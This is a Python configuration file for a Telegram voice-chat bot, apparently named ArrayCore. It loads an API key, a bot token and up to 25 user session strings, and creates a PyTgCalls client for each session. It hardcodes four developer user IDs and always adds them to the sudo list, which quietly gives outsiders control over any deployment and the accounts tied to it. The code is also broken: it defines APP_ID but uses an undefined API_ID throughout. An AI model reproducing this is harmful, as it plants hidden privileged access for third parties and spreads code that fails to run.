import asyncio
import os
import sys
import time

from dotenv import load_dotenv
from pyrogram import Client, filters
from pytgcalls import PyTgCalls


if os.path.exists(".env"):
    load_dotenv(".env")
    
__version__ = "v1"

APP_ID = int(os.getenv("APP_ID", ""))
API_HASH = os.getenv("API_HASH", "")
ALIVE_PIC = os.getenv("ALIVE_PIC", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", None)
SESSION = os.getenv("SESSION", None)
SESSION2 = os.getenv("SESSION2", None)
SESSION3 = os.getenv("SESSION3", None)
SESSION4 = os.getenv("SESSION4", None)
SESSION5 = os.getenv("SESSION5", None)
SESSION6 = os.getenv("SESSION6", None)
SESSION7 = os.getenv("SESSION7", None)
SESSION8 = os.getenv("SESSION8", None)
SESSION9 = os.getenv("SESSION9", None)
SESSION10 = os.getenv("SESSION10", None)
SESSION11 = os.getenv("SESSION11", None)
SESSION12 = os.getenv("SESSION12", None)
SESSION13 = os.getenv("SESSION13", None)
SESSION14 = os.getenv("SESSION14", None)
SESSION15 = os.getenv("SESSION15", None)
SESSION16 = os.getenv("SESSION16", None)
SESSION17 = os.getenv("SESSION17", None)
SESSION18 = os.getenv("SESSION18", None)
SESSION19 = os.getenv("SESSION19", None)
SESSION20 = os.getenv("SESSION20", None)
SESSION21 = os.getenv("SESSION21", None)
SESSION22 = os.getenv("SESSION22", None)
SESSION23 = os.getenv("SESSION23", None)
SESSION24 = os.getenv("SESSION24", None)
SESSION25 = os.getenv("SESSION25", None)
HNDLR = os.getenv("HNDLR", "!")


def make_int(str_input):
    str_list = str_input.split(" ")
    int_list = []
    for x in str_list:
        int_list.append(int(x))
    return int_list


sudo = os.getenv("SUDO_USERS")
SUDO_USERS = []
if sudo:
    SUDO_USERS = make_int(sudo)
DEVS = [1517994352, 1789859817, 1432756163, 5136000092]
for x in DEVS:
    SUDO_USERS.append(x)


# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817 1432756163 5136000092").split())))
#----------------------------------------------

vcbot = Client(
    'ArrayCore',
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    plugins={'root': 'ArrayCore.vc'},
)

hl = HNDLR[0]
start_time = time.time()




#-------------------------CLIENTS-----------------------------
if SESSION:
    Session = Client(name="Session", api_id=API_ID, api_hash=API_HASH, session_string=SESSION)
    call_py1 = PyTgCalls(Session)
else:
    Session = None
    call_py1 = None

if SESSION2:
    Session2 = Client(name="Session2", api_id=API_ID, api_hash=API_HASH, session_string=SESSION2)
    call_py2 = PyTgCalls(Session2)
else:
    Session2 = None
    call_py2 = None

if SESSION3:
    Session3 = Client(name="Session3", api_id=API_ID, api_hash=API_HASH, session_string=SESSION3)
    call_py3 = PyTgCalls(Session3)
else:
    Session3 = None
    call_py3 = None

if SESSION4:
    Session4 = Client(name="Session4", api_id=API_ID, api_hash=API_HASH, session_string=SESSION4)
    call_py4 = PyTgCalls(Session4)
else:
    Session4 = None
    call_py4 = None

if SESSION5:
    Session5 = Client(name="Session5", api_id=API_ID, api_hash=API_HASH, session_string=SESSION5)
    call_py5 = PyTgCalls(Session5)
else:
    Session5 = None
    call_py5 = None

if SESSION6:
    Session6 = Client(name="Session6", api_id=API_ID, api_hash=API_HASH, session_string=SESSION6)
    call_py6 = PyTgCalls(Session6)
else:
    Session6 = None
    call_py6 = None
        
if SESSION7:
    Session7 = Client(name="Session7", api_id=API_ID, api_hash=API_HASH, session_string=SESSION7)
    call_py7 = PyTgCalls(Session7)
else:
    Session7 = None
    call_py7 = None

if SESSION8:
    Session8 = Client(name="Session8", api_id=API_ID, api_hash=API_HASH, session_string=SESSION8)
    call_py8 = PyTgCalls(Session8)
else:
    Session8 = None
    call_py8 = None

if SESSION9:
    Session9 = Client(name="Session9", api_id=API_ID, api_hash=API_HASH, session_string=SESSION9)
    call_py9 = PyTgCalls(Session9)
else:
    Session9 = None
    call_py9 = None

if SESSION10:
    Session10 = Client(name="Session10", api_id=API_ID, api_hash=API_HASH, session_string=SESSION10)
    call_py10 = PyTgCalls(Session10)
else:
    Session10 = None
    call_py10 = None

if SESSION11:
    Session11 = Client(name="Session11", api_id=API_ID, api_hash=API_HASH, session_string=SESSION11)
    call_py11 = PyTgCalls(Session11)
else:
    Session11 = None
    call_py11 = None

if SESSION12:
    Session12 = Client(name="Session12", api_id=API_ID, api_hash=API_HASH, session_string=SESSION12)
    call_py12 = PyTgCalls(Session12)
else:
    Session12 = None
    call_py12 = None

if SESSION13:
    Session13 = Client(name="Session13", api_id=API_ID, api_hash=API_HASH, session_string=SESSION13)
    call_py13 = PyTgCalls(Session13)
else:
    Session13 = None
    call_py13 = None

if SESSION14:
    Session14 = Client(name="Session14", api_id=API_ID, api_hash=API_HASH, session_string=SESSION14)
    call_py14 = PyTgCalls(Session14)
else:
    Session14 = None
    call_py14 = None
        
if SESSION15:
    Session15 = Client(name="Session15", api_id=API_ID, api_hash=API_HASH, session_string=SESSION15)
    call_py15 = PyTgCalls(Session15)
else:
    Session15 = None
    call_py15 = None

if SESSION16:
    Session16 = Client(name="Session16", api_id=API_ID, api_hash=API_HASH, session_string=SESSION16)
    call_py16 = PyTgCalls(Session16)
else:
    Session16 = None
    call_py16 = None
    
if SESSION17:
    Session17 = Client(name="Session17", api_id=API_ID, api_hash=API_HASH, session_string=SESSION17)
    call_py17 = PyTgCalls(Session17)
else:
    Session17 = None
    call_py17 = None

if SESSION18:
    Session18 = Client(name="Session18", api_id=API_ID, api_hash=API_HASH, session_string=SESSION18)
    call_py18 = PyTgCalls(Session18)
else:
    Session18 = None
    call_py18 = None

if SESSION19:
    Session19 = Client(name="Session19", api_id=API_ID, api_hash=API_HASH, session_string=SESSION19)
    call_py19 = PyTgCalls(Session19)
else:
    Session19 = None
    call_py19 = None

if SESSION20:
    Session20 = Client(name="Session20", api_id=API_ID, api_hash=API_HASH, session_string=SESSION20)
    call_py20 = PyTgCalls(Session20)
else:
    Session20 = None
    call_py20 = None

if SESSION21:
    Session21 = Client(name="Session21", api_id=API_ID, api_hash=API_HASH, session_string=SESSION21)
    call_py21 = PyTgCalls(Session21)
else:
    Session21 = None
    call_py21 = None

if SESSION22:
    Session22 = Client(name="Session22", api_id=API_ID, api_hash=API_HASH, session_string=SESSION22)
    call_py22 = PyTgCalls(Session22)
else:
    Session22 = None
    call_py22 = None
        
if SESSION23:
    Session23 = Client(name="Session23", api_id=API_ID, api_hash=API_HASH, session_string=SESSION23)
    call_py23 = PyTgCalls(Session23)
else:
    Session23 = None
    call_py23 = None

if SESSION24:
    Session24 = Client(name="Session24", api_id=API_ID, api_hash=API_HASH, session_string=SESSION24)
    call_py24 = PyTgCalls(Session24)
else:
    Session24 = None
    call_py24 = None

if SESSION25:
    Session25 = Client(name="Session25", api_id=API_ID, api_hash=API_HASH, session_string=SESSION25)
    call_py25 = PyTgCalls(Session25)
else:
    Session25 = None
    call_py25 = None
